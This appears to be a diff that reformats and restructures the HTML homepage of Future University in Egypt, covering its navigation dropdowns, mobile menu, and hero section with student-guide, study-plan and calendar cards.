@@ -1,1271 +1,1757 @@
 <!DOCTYPE html>
 <html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>FUTURE UNIVERSITY IN EGYPT</title>
+    <link
+      rel="icon"
+      type="image/png"
+      href="./images/fav1-removebg-preview.png"
+    />
+    <link rel="stylesheet" href="./style.css" />
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <script src="https://cdn.jsdelivr.net/npm/lucide@0.441.0/dist/umd/lucide.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              "university-red": "#B91C1C",
+            },
+          },
+        },
+      };
+    </script>
+  </head>
 
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>FUTURE UNIVERSITY IN EGYPT</title>
-  <link rel="icon" type="image/png" href="./images/fav1-removebg-preview.png">
-  <link rel="stylesheet" href="./style.css">
-  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
-  <script src="https://cdn.jsdelivr.net/npm/lucide@0.441.0/dist/umd/lucide.min.js"></script>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script>
-    tailwind.config = {
-      theme: {
-        extend: {
-          colors: {
-            'university-red': '#B91C1C',
-          }
-        }
-      }
-    }
-  </script>
+  <body id="root">
+    <div class="min-h-screen bg-gray-50">
+      <!-- Header -->
 
-</head>
+      <div class="bg-white sticky top-0 z-50 px-2 md:px-8 lg:px-12">
+        <nav
+          class="max-w-[1560px] mx-auto shadow-sm border-b border-gray-200 border-black/10"
+        >
+          <div class="max-full mx-auto px-4 sm:px-6 lg:px-0">
+            <div class="flex justify-between items-center h-16">
+              <!-- Logo and Language -->
+              <div class="flex items-center gap-10">
+                <a href="index.html">
+                  <img
+                    src="https://api.builder.io/api/v1/image/assets/TEMP/2d316bb90db8bdfd99985c7d8b9a3db4557ec01d?width=310"
+                    alt="Future University in Egypt"
+                    class="h-12 w-auto"
+                  />
+                </a>
 
-<body id="root">
-  <div class="min-h-screen bg-gray-50">
-
-
-
-
-    <!-- Header -->
-
-    <div class="bg-white sticky top-0 z-50 px-2 md:px-8 lg:px-12">
-    <nav class="max-w-[1560px] mx-auto shadow-sm border-b border-gray-200 border-black/10">
-      <div class="max-full mx-auto px-4 sm:px-6 lg:px-0">
-        <div class="flex justify-between items-center h-16">
-          <!-- Logo and Language -->
-          <div class="flex items-center gap-10">
-            <a href="index.html">
-              <img
-                src="https://api.builder.io/api/v1/image/assets/TEMP/2d316bb90db8bdfd99985c7d8b9a3db4557ec01d?width=310"
-                alt="Future University in Egypt" class="h-12 w-auto" />
-            </a>
-
-            <!-- Language Selector -->
-            <div class="relative">
-              <button id="languageBtn"
-                class="bg-university-red text-white px-2 lg:px-4 py-2 rounded text-sm font-medium flex items-center bg-red-700 hover:bg-red-700 transition-colors">
-                En
-                <svg class="ml-2 h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-                </svg>
-              </button>
-              <div id="languageDropdown"
-                class="absolute right-0 mt-2 w-48 bg-white rounded-md shadow-lg py-1 z-50 hidden">
-                <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">English</a>
-                <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Arabic</a>
-              </div>
-            </div>
-          </div>
-
-          <!-- Desktop Navigation -->
-          <div class="hidden md:flex items-center space-x-8">
-            <!-- Navigation Links -->
-            <div class="flex items-center space-x-6">
-              <a href="#" class="text-gray-700 hover:text-university-red font-medium transition-colors">Home</a>
-
-              <!-- Student Guide Dropdown -->
-              <div class="relative">
-                <button class="text-gray-700 hover:text-university-red font-medium flex items-center transition-colors"
-                  id="studentGuideBtn">
-                  Student Guide
-                  <svg class="ml-1 h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-                  </svg>
-                </button>
-                <div id="studentGuideDropdown"
-                  class="absolute left-0 mt-2 w-64 bg-white rounded-md shadow-lg py-2 z-50 hidden overflow-hidden">
-                  <!-- Admission Policies & Procedures -->
-                  <div class="group">
-                    <a href="#"
-                      class="flex justify-between items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors">
-                      <span>Admission Policies & Procedures</span>
-                      <svg class="h-4 w-4 text-gray-400 group-hover:rotate-90 transition-transform" fill="none"
-                        viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
-                      </svg>
-                    </a>
-                    <div class="hidden group-hover:block bg-gray-50 border-t">
-                      <div class="px-4 py-2 text-xs text-gray-600 space-y-3">
-                        <div class="font-medium cursor-pointer">
-                          Admission Policy at FUE
-                        </div>
-                        <div class="cursor-pointer">General Framework of Admission Policies</div>
-                        <div class="cursor-pointer">FUE Application Procedures</div>
-                        <div class="cursor-pointer">Booking Admission Tests</div>
-                        <div class="cursor-pointer">Final Admission Procedures</div>
-                        <div class="cursor-pointer">General Documents Required</div>
-                        <div class="cursor-pointer">General Admission Rules</div>
-                        <div class="cursor-pointer">Applicant Selection Criteria</div>
-                      </div>
-                    </div>
-                  </div>
-
-                  <!-- Study System -->
-                  <div class="group">
-                    <a href="#"
-                      class="flex justify-between items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors">
-                      <span>Study System</span>
-                      <svg class="h-4 w-4 text-gray-400 group-hover:rotate-90 transition-transform" fill="none"
-                        viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
-                      </svg>
-                    </a>
-                    <div class="hidden group-hover:block bg-gray-50 border-t">
-                      <div class="px-4 py-2 text-xs text-gray-600 space-y-3">
-                        <div class="cursor-pointer">Credit Hour System</div>
-                        <div class="cursor-pointer">Definition of a Credit Hour</div>
-                        <div class="cursor-pointer">Academic Semesters</div>
-                        <div class="cursor-pointer">Student Assessment Policy</div>
-                        <div class="cursor-pointer">Student Examination</div>
-                      </div>
-                    </div>
-                  </div>
-
-                  <!-- Student Rights & Responsibilities -->
-                  <div class="group">
-                    <a href="#"
-                      class="flex justify-between items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors">
-                      <span>Student Rights & Responsibilities</span>
-                      <svg class="h-4 w-4 text-gray-400 group-hover:rotate-90 transition-transform" fill="none"
-                        viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
-                      </svg>
-                    </a>
-                    <div class="hidden group-hover:block bg-gray-50 border-t">
-                      <div class="px-4 py-2 text-xs text-gray-600 space-y-3">
-                        <div class="cursor-pointer">Student Conduct</div>
-                        <div class="cursor-pointer">Complaints and Grievance</div>
-                        <div class="cursor-pointer">Student Rights</div>
-                        <div class="cursor-pointer">Student Responsibilities</div>
-                      </div>
-                    </div>
-                  </div>
-
-                  <!-- Online Communication Platforms -->
-                  <div class="group">
-                    <a href="#"
-                      class="flex justify-between items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors">
-                      <span>Online Platforms</span>
-                      <svg class="h-4 w-4 text-gray-400 group-hover:rotate-90 transition-transform" fill="none"
-                        viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
-                      </svg>
-                    </a>
-                    <div class="hidden group-hover:block bg-gray-50 border-t">
-                      <div class="px-4 py-2 text-xs text-gray-600 space-y-3">
-                        <div class="cursor-pointer">Moodle Platform</div>
-                        <div class="cursor-pointer">Student Portal</div>
-                        <div class="cursor-pointer">University Email</div>
-                        <div class="cursor-pointer">Zoom for Virtual Lectures</div>
-                        <div class="cursor-pointer">Technical Support</div>
-                      </div>
-                    </div>
-                  </div>
-
-                  <!-- Student Support -->
-                  <div class="group">
-                    <a href="#"
-                      class="flex justify-between items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors">
-                      <span>Student Support</span>
-                      <svg class="h-4 w-4 text-gray-400 group-hover:rotate-90 transition-transform" fill="none"
-                        viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
-                      </svg>
-                    </a>
-                    <div class="hidden group-hover:block bg-gray-50 border-t">
-                      <div class="px-4 py-2 text-xs text-gray-600 space-y-3">
-                        <div class="cursor-pointer">Computer & IT Resources</div>
-                        <div class="cursor-pointer">Internet Usage Policies</div>
-                        <div class="cursor-pointer">Student Services</div>
-                      </div>
-                    </div>
+                <!-- Language Selector -->
+                <div class="relative">
+                  <button
+                    id="languageBtn"
+                    class="bg-university-red text-white px-2 lg:px-4 py-2 rounded text-sm font-medium flex items-center bg-red-700 hover:bg-red-700 transition-colors"
+                  >
+                    En
+                    <svg
+                      class="ml-2 h-4 w-4"
+                      fill="none"
+                      stroke="currentColor"
+                      viewBox="0 0 24 24"
+                    >
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        stroke-width="2"
+                        d="M19 9l-7 7-7-7"
+                      ></path>
+                    </svg>
+                  </button>
+                  <div
+                    id="languageDropdown"
+                    class="absolute right-0 mt-2 w-48 bg-white rounded-md shadow-lg py-1 z-50 hidden"
+                  >
+                    <a
+                      href="#"
+                      class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                      >English</a
+                    >
+                    <a
+                      href="#"
+                      class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                      >Arabic</a
+                    >
                   </div>
                 </div>
               </div>
 
-              <!-- Study Plans Dropdown -->
-              <div class="relative">
-                <button class="text-gray-700 hover:text-university-red font-medium flex items-center transition-colors"
-                  id="studyPlansBtn">
-                  Study Plans
-                  <svg class="ml-1 h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-                  </svg>
-                </button>
-                <div id="studyPlansDropdown"
-                  class="absolute left-0 mt-2 w-48 bg-white rounded-md shadow-lg py-1 z-50 hidden">
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Faculty of Oral & Dental
-                    Medicine</a>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Faculty of Pharmacy</a>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Faculty of Engineering &
-                    Technology</a>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Faculty Of Computers &
-                    Information Technology</a>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Faculty of Economics &
-                    Political Science</a>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Faculty of Commerce &
-                    Business Administration</a>
-                </div>
-              </div>
+              <!-- Desktop Navigation -->
+              <div class="hidden md:flex items-center space-x-8">
+                <!-- Navigation Links -->
+                <div class="flex items-center space-x-6">
+                  <a
+                    href="#"
+                    class="text-gray-700 hover:text-university-red font-medium transition-colors"
+                    >Home</a
+                  >
 
-              <!-- Academic Calendar Dropdown -->
-              <div class="relative">
-                <button class="text-gray-700 hover:text-university-red font-medium flex items-center transition-colors"
-                  id="academicCalendarBtn">
-                  Academic Calendar
-                  <svg class="ml-1 h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-                  </svg>
-                </button>
-                <div id="academicCalendarDropdown"
-                  class="absolute left-0 mt-2 w-48 bg-white rounded-md shadow-lg py-1 z-50 hidden">
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Fall 2025 Semester
-                    Summary</a>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Fall 2025
-                    Highlights.</a>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Fall 2025 Semester
-                    Details</a>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Spring 2026 Semester
-                    Summary</a>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Spring 2026
-                    Highlights</a>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Spring 2026 Semester
-                    Details</a>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Summer 2026 Semester
-                    Summary</a>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Summer 2026
-                    Highlights</a>
-                  <a href="#" class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">Summer 2026 Semester
-                    Details</a>
-                </div>
-              </div>
-            </div>
-          </div>
-
-          <!-- Mobile menu button -->
-          <div class="md:hidden">
-            <button id="mobileMenuBtn"
-              class="text-gray-700 hover:text-university-red focus:outline-none focus:text-university-red transition-colors">
-              <svg class="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path id="menuIcon" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                  d="M4 6h16M4 12h16M4 18h16"></path>
-                <path id="closeIcon" class="hidden" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                  d="M6 18L18 6M6 6l12 12"></path>
-              </svg>
-            </button>
-          </div>
-        </div>
-      </div>
-
-      <!-- Mobile Navigation Menu -->
-      <div id="mobileMenu" class="md:hidden hidden bg-white border-t border-gray-200">
-        <div class="px-4 pt-2 pb-3 space-y-1">
-          <!-- Language Selector Mobile -->
-
-          <a href="#"
-            class="block px-3 py-2 text-base font-medium text-gray-700 hover:text-university-red hover:bg-gray-50 rounded-md transition-colors">Home</a>
-
-          <!-- Mobile Student Guide -->
-          <div>
-            <button id="mobileStudentGuideBtn"
-              class="w-full flex items-center justify-between px-3 py-2 text-base font-medium text-gray-700 hover:text-university-red hover:bg-gray-50 rounded-md transition-colors">
-              Student Guide
-              <svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-              </svg>
-            </button>
-            <div id="mobileStudentGuideDropdown" class="ml-4 mt-2 space-y-1 hidden">
-              <a href="#"
-                class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md">Admission
-                Guide</a>
-              <a href="#"
-                class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md">Course
-                Registration</a>
-              <a href="#"
-                class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md">Student
-                Services</a>
-              <a href="#"
-                class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md">Campus
-                Life</a>
-            </div>
-          </div>
-
-          <!-- Mobile Study Plans -->
-          <div>
-            <button id="mobileStudyPlansBtn"
-              class="w-full flex items-center justify-between px-3 py-2 text-base font-medium text-gray-700 hover:text-university-red hover:bg-gray-50 rounded-md transition-colors">
-              Study Plans
-              <svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-              </svg>
-            </button>
-            <div id="mobileStudyPlansDropdown" class="ml-4 mt-2 space-y-1 hidden">
-              <a href="#"
-                class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md">Undergraduate</a>
-              <a href="#"
-                class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md">Graduate</a>
-              <a href="#"
-                class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md">Doctoral</a>
-              <a href="#"
-                class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md">Certificate
-                Programs</a>
-            </div>
-          </div>
-
-          <!-- Mobile Academic Calendar -->
-          <div>
-            <button id="mobileAcademicCalendarBtn"
-              class="w-full flex items-center justify-between px-3 py-2 text-base font-medium text-gray-700 hover:text-university-red hover:bg-gray-50 rounded-md transition-colors">
-              Academic Calendar
-              <svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
-              </svg>
-            </button>
-            <div id="mobileAcademicCalendarDropdown" class="ml-4 mt-2 space-y-1 hidden">
-              <a href="#"
-                class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md">Fall
-                Semester</a>
-              <a href="#"
-                class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md">Spring
-                Semester</a>
-              <a href="#"
-                class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md">Summer
-                Session</a>
-              <a href="#"
-                class="block px-3 py-2 text-sm text-gray-600 hover:text-university-red hover:bg-gray-50 rounded-md">Important
-                Dates</a>
-            </div>
-          </div>
-        </div>
-      </div>
-    </nav>
-  </div>
-
-
-    <!-- Hero Section -->
-
-
-    <section class="relative min-h-[650px] sm:min-h-[750px] lg:h-[850px] flex items-center px-2 md:px-8 lg:px-12">
-      <div class="absolute inset-0 bg-cover bg-center" style="
-        background-image: url('https://api.builder.io/api/v1/image/assets/TEMP/cb2af87c7c105e38a742a7ff6e0ccab58a35b804?width=3840');
-      "></div>
-      <div class="absolute inset-0 bg-black/40"></div>
-
-      <div
-        class="relative py-10 md:py-0 max-w-[1560px] mx-auto px-4 sm:px-6 lg:px-0 grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-12 items-center">
-        <!-- Left Content -->
-        <div class="space-y-8 sm:space-y-10 text-center lg:text-left">
-          <div class="space-y-6">
-            <div class="inline-flex items-center px-4 py-1.5 bg-[#B11116] text-white text-xs font-medium rounded-full">
-              FUTURE UNIVERSITY IN EGYPT
-            </div>
-
-            <div class="space-y-6">
-              <div class="space-y-2">
-                <h1 class="text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-bold leading-tight">
-                  <span class="text-white">Shape Your Future </span>
-                  <span class="text-[#FACC15]">Through Education</span>
-                </h1>
-                <div class="w-20 sm:w-24 md:w-28 h-1.5 bg-[#B11116] mx-auto lg:mx-0"></div>
-              </div>
-              <p class="text-gray-200 text-base sm:text-lg leading-relaxed max-w-2xl mx-auto lg:mx-0">
-                Discover a world-class education that prepares you for success
-                in a global environment
-              </p>
-            </div>
-          </div>
-
-          <div class="space-y-6 sm:space-y-8">
-            <div class="relative max-w-[408px] mx-auto lg:mx-0">
-              <input type="text" placeholder="Search programs, courses, events..."
-                class="w-full flex items-center gap-3 p-4 rounded-md border border-white/20 bg-white/5 backdrop-blur-sm text-gray-300 placeholder-gray-300 focus:outline-none focus:ring-1 focus:ring-white/30 pl-12" />
-              <i data-lucide="search" class="absolute left-5 !top-[19px] w-5 h-5 text-gray-300 pointer-events-none"></i>
-            </div>
-
-            <button
-              class="flex items-center justify-center lg:justify-start gap-2 bg-[#B11116] text-white px-6 py-4 rounded-md shadow-lg hover:bg-[#A10F14] transition-colors mx-auto lg:mx-0">
-              <span class="font-medium">Explore Programs</span>
-              <i data-lucide="arrow-right" class="w-4 h-4"></i>
-            </button>
-          </div>
-        </div>
-
-        <!-- Right Content - Cards -->
-        <div class="space-y-8 sm:space-y-10">
-          <div class=" flex flex-col gap-2">
-            <!-- Student Guide Card -->
-            <a href="student-guide.html">
-              <div
-                class="flex items-center justify-between p-6 rounded-xl border border-gray-500/50 bg-black/30 backdrop-blur-sm">
-                <div class="flex items-center gap-4">
-                  <div class="p-3 bg-[#B11116] rounded-md">
-                    <i data-lucide="book-open" class="w-8 h-8 text-white"></i>
-                  </div>
-                  <div>
-                    <h3 class="text-white text-lg font-semibold">
+                  <!-- Student Guide Dropdown -->
+                  <div class="relative">
+                    <button
+                      class="text-gray-700 hover:text-university-red font-medium flex items-center transition-colors"
+                      id="studentGuideBtn"
+                    >
                       Student Guide
-                    </h3>
-                    <p class="text-white/80">
-                      Essential information for students
-                    </p>
-                  </div>
-                </div>
-                <i data-lucide="arrow-right" class="w-5 h-5 text-white"></i>
-              </div>
-            </a>
+                      <svg
+                        class="ml-1 h-4 w-4"
+                        fill="none"
+                        stroke="currentColor"
+                        viewBox="0 0 24 24"
+                      >
+                        <path
+                          stroke-linecap="round"
+                          stroke-linejoin="round"
+                          stroke-width="2"
+                          d="M19 9l-7 7-7-7"
+                        ></path>
+                      </svg>
+                    </button>
+                    <div
+                      id="studentGuideDropdown"
+                      class="absolute left-0 mt-2 w-64 bg-white rounded-md shadow-lg py-2 z-50 hidden overflow-hidden"
+                    >
+                      <!-- Admission Policies & Procedures -->
+                      <div class="group">
+                        <a
+                          href="#"
+                          class="flex justify-between items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors"
+                        >
+                          <span>Admission Policies & Procedures</span>
+                          <svg
+                            class="h-4 w-4 text-gray-400 group-hover:rotate-90 transition-transform"
+                            fill="none"
+                            viewBox="0 0 24 24"
+                            stroke="currentColor"
+                          >
+                            <path
+                              stroke-linecap="round"
+                              stroke-linejoin="round"
+                              stroke-width="2"
+                              d="M9 5l7 7-7 7"
+                            />
+                          </svg>
+                        </a>
+                        <div
+                          class="hidden group-hover:block bg-gray-50 border-t"
+                        >
+                          <div
+                            class="px-4 py-2 text-xs text-gray-600 space-y-3"
+                          >
+                            <div class="font-medium cursor-pointer">
+                              Admission Policy at FUE
+                            </div>
+                            <div class="cursor-pointer">
+                              General Framework of Admission Policies
+                            </div>
+                            <div class="cursor-pointer">
+                              FUE Application Procedures
+                            </div>
+                            <div class="cursor-pointer">
+                              Booking Admission Tests
+                            </div>
+                            <div class="cursor-pointer">
+                              Final Admission Procedures
+                            </div>
+                            <div class="cursor-pointer">
+                              General Documents Required
+                            </div>
+                            <div class="cursor-pointer">
+                              General Admission Rules
+                            </div>
+                            <div class="cursor-pointer">
+                              Applicant Selection Criteria
+                            </div>
+                          </div>
+                        </div>
+                      </div>
 
-            <!-- Study Plans Card -->
-            <a href="study-plan.html">
-              <div
-                class="flex items-center justify-between p-6 rounded-xl border border-gray-500/50 bg-black/30 backdrop-blur-sm">
-                <div class="flex items-center gap-4">
-                  <div class="p-3 bg-[#B11116] rounded-md">
-                    <i data-lucide="graduation-cap" class="w-8 h-8 text-white"></i>
+                      <!-- Study System -->
+                      <div class="group">
+                        <a
+                          href="#"
+                          class="flex justify-between items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors"
+                        >
+                          <span>Study System</span>
+                          <svg
+                            class="h-4 w-4 text-gray-400 group-hover:rotate-90 transition-transform"
+                            fill="none"
+                            viewBox="0 0 24 24"
+                            stroke="currentColor"
+                          >
+                            <path
+                              stroke-linecap="round"
+                              stroke-linejoin="round"
+                              stroke-width="2"
+                              d="M9 5l7 7-7 7"
+                            />
+                          </svg>
+                        </a>
+                        <div
+                          class="hidden group-hover:block bg-gray-50 border-t"
+                        >
+                          <div
+                            class="px-4 py-2 text-xs text-gray-600 space-y-3"
+                          >
+                            <div class="cursor-pointer">Credit Hour System</div>
+                            <div class="cursor-pointer">
+                              Definition of a Credit Hour
+                            </div>
+                            <div class="cursor-pointer">Academic Semesters</div>
+                            <div class="cursor-pointer">
+                              Student Assessment Policy
+                            </div>
+                            <div class="cursor-pointer">
+                              Student Examination
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+
+                      <!-- Student Rights & Responsibilities -->
+                      <div class="group">
+                        <a
+                          href="#"
+                          class="flex justify-between items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors"
+                        >
+                          <span>Student Rights & Responsibilities</span>
+                          <svg
+                            class="h-4 w-4 text-gray-400 group-hover:rotate-90 transition-transform"
+                            fill="none"
+                            viewBox="0 0 24 24"
+                            stroke="currentColor"
+                          >
+                            <path
+                              stroke-linecap="round"
+                              stroke-linejoin="round"
+                              stroke-width="2"
+                              d="M9 5l7 7-7 7"
+                            />
+                          </svg>
+                        </a>
+                        <div
+                          class="hidden group-hover:block bg-gray-50 border-t"
+                        >
+                          <div
+                            class="px-4 py-2 text-xs text-gray-600 space-y-3"
+                          >
+                            <div class="cursor-pointer">Student Conduct</div>
+                            <div class="cursor-pointer">
+                              Complaints and Grievance
+                            </div>
+                            <div class="cursor-pointer">Student Rights</div>
+                            <div class="cursor-pointer">
+                              Student Responsibilities
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+
+                      <!-- Online Communication Platforms -->
+                      <div class="group">
+                        <a
+                          href="#"
+                          class="flex justify-between items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors"
+                        >
+                          <span>Online Platforms</span>
+                          <svg
+                            class="h-4 w-4 text-gray-400 group-hover:rotate-90 transition-transform"
+                            fill="none"
+                            viewBox="0 0 24 24"
+                            stroke="currentColor"
+                          >
+                            <path
+                              stroke-linecap="round"
+                              stroke-linejoin="round"
+                              stroke-width="2"
+                              d="M9 5l7 7-7 7"
+                            />
+                          </svg>
+                        </a>
+                        <div
+                          class="hidden group-hover:block bg-gray-50 border-t"
+                        >
+                          <div
+                            class="px-4 py-2 text-xs text-gray-600 space-y-3"
+                          >
+                            <div class="cursor-pointer">Moodle Platform</div>
+                            <div class="cursor-pointer">Student Portal</div>
+                            <div class="cursor-pointer">University Email</div>
+                            <div class="cursor-pointer">
+                              Zoom for Virtual Lectures
+                            </div>
+                            <div class="cursor-pointer">Technical Support</div>
+                          </div>
+                        </div>
+                      </div>
+
+                      <!-- Student Support -->
+                      <div class="group">
+                        <a
+                          href="#"
+                          class="flex justify-between items-center px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 transition-colors"
+                        >
+                          <span>Student Support</span>
+                          <svg
+                            class="h-4 w-4 text-gray-400 group-hover:rotate-90 transition-transform"
+                            fill="none"
+                            viewBox="0 0 24 24"
+                            stroke="currentColor"
+                          >
+                            <path
+                              stroke-linecap="round"
+                              stroke-linejoin="round"
+                              stroke-width="2"
+                              d="M9 5l7 7-7 7"
+                            />
+                          </svg>
+                        </a>
+                        <div
+                          class="hidden group-hover:block bg-gray-50 border-t"
+                        >
+                          <div
+                            class="px-4 py-2 text-xs text-gray-600 space-y-3"
+                          >
+                            <div class="cursor-pointer">
+                              Computer & IT Resources
+                            </div>
+                            <div class="cursor-pointer">
+                              Internet Usage Policies
+                            </div>
+                            <div class="cursor-pointer">Student Services</div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
                   </div>
-                  <div>
-                    <h3 class="text-white text-lg font-semibold">
+
+                  <!-- Study Plans Dropdown -->
+                  <div class="relative">
+                    <button
+                      class="text-gray-700 hover:text-university-red font-medium flex items-center transition-colors"
+                      id="studyPlansBtn"
+                    >
                       Study Plans
-                    </h3>
-                    <p class="text-white/80">Academic pathways and programs</p>
+                      <svg
+                        class="ml-1 h-4 w-4"
+                        fill="none"
+                        stroke="currentColor"
+                        viewBox="0 0 24 24"
+                      >
+                        <path
+                          stroke-linecap="round"
+                          stroke-linejoin="round"
+                          stroke-width="2"
+                          d="M19 9l-7 7-7-7"
+                        ></path>
+                      </svg>
+                    </button>
+                    <div
+                      id="studyPlansDropdown"
+                      class="absolute left-0 mt-2 w-48 bg-white rounded-md shadow-lg py-1 z-50 hidden"
+                    >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Faculty of Oral & Dental Medicine</a
+                      >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Faculty of Pharmacy</a
+                      >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Faculty of Engineering & Technology</a
+                      >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Faculty Of Computers & Information Technology</a
+                      >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Faculty of Economics & Political Science</a
+                      >
+                      <a
+                        href="#"
+                        class="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100"
+                        >Faculty of Commerce & Business Administration</a
+                      >
+                    </div>
                   </div>
-                </div>
-                <i data-lucide="arrow-right" class="w-5 h-5 text-white"></i>
-              </div>
-            </a>
 
-            <!-- Academic Calendar Card -->
-            <a href="academic-calendar-and-list.html">
-              <div
-                class="flex items-center justify-between p-6 rounded-xl border border-gray-500/50 bg-black/30 backdrop-blur-sm">
-                <div class="flex items-center gap-4">
-                  <div class="p-3 bg-[#B11116] rounded-md">
-                    <i data-lucide="calendar" class="w-8 h-8 text-white"></i>
-                  </div>
-                  <div>
-                    <h3 class="text-white text-lg font-semibold">
+                  <!-- Academic Calendar Dropdown -->
+                  <div class="relative">
+                    <button
+                      class="text-gray-700 hover:text-university-red font-medium flex items-center transition-colors"
+                      id="academicCalendarBtn"
+                    >
                       Academic Calendar
-                    </h3>
-                    <p class="text-white/80">Important dates and deadlines</p>
+                      <svg
+                        class="ml-1 h-4 w-4"
+                        fill="none"
+                        stroke="currentColor"
